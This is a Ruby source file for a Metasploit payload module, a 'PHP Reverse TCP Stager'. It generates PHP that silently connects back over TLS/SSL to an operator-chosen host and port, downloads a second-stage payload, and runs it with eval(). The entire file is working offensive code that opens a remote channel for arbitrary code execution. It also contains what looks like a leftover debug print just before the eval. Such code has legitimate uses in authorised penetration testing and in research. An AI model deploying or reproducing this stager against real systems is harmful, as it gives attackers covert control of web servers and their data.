##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/php/reverse_tcp'

module Metasploit4

  CachedSize = 951

  include Msf::Payload::Stager
  include Msf::Payload::Php::ReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'PHP Reverse TCP Stager',
      'Description' => 'Reverse PHP connect back stager with checks for disabled functions',
      'Author'      => 'egypt',
      'License'     => MSF_LICENSE,
      'Platform'    => 'php',
      'Arch'        => ARCH_PHP,
      'Handler'     => Msf::Handler::ReverseTcpSsl,
      'Stager'      => {'Payload' => ""}
    ))
  end

  def generate_reverse_tcp(opts={})
    ipf = "AF_INET";
    if Rex::Socket.is_ipv6?(opts[:host])
      ipf << "6"
      opts[:host] = "[#{opts[:host]}]"
    end

    php = %Q^/*<?php /**/
if (is_callable('stream_get_transports')) {
  $a = [ 'tls', 'ssl', 'sslv3', 'sslv2' ];
  $b = stream_get_transports();
  $intersect = array_intersect($a, $b);
  $proto = array_shift($intersect);
} else {
  $proto = 'ssl';
}
error_reporting(0);
$ip = '#{opts[:host]}';
$port = #{opts[:port]};

if (($f = 'stream_socket_client') && is_callable($f)) {
  $s = $f("{$proto}://{$ip}:{$port}");
  $s_type = 'stream';
} elseif (($f = 'fsockopen') && is_callable($f)) {
  $s = $f("{$proto}://{$ip}", $port);
  $s_type = 'stream';
} else {
  die('no socket funcs');
}
if (!$s) { die('no socket'); }
^

    php << php_send_uuid if include_send_uuid

    php << %Q^switch ($s_type) {
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
  # We failed on the main socket.  There's no way to continue, so
  # bail
  die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
  switch ($s_type) {
  case 'stream': $b .= fread($s, $len-strlen($b)); break;
  case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
  }
}
$a = stream_get_transports();
print_r($a);

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
eval($b);
die();^
  end
end
